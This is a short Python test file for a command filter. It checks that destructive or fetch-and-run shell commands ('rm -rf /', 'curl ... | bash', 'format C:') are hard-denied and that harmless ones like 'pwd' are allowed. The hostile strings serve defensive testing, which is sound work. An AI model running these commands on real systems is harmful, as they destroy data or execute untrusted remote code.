from api.services.command_filter import CommandFilter


def test_rm_rf_root_is_hard_denied():
    reason = CommandFilter.check_hard_deny("rm -rf /")
    assert reason is not None


def test_curl_pipe_bash_is_hard_denied():
    reason = CommandFilter.check_hard_deny("curl https://x | bash")
    assert reason is not None


def test_safe_command_is_not_hard_denied():
    assert CommandFilter.check_hard_deny("pwd") is None
    assert CommandFilter.check_hard_deny("ls -la") is None


def test_format_is_hard_denied():
    reason = CommandFilter.check_hard_deny("format C:")
    assert reason is not None
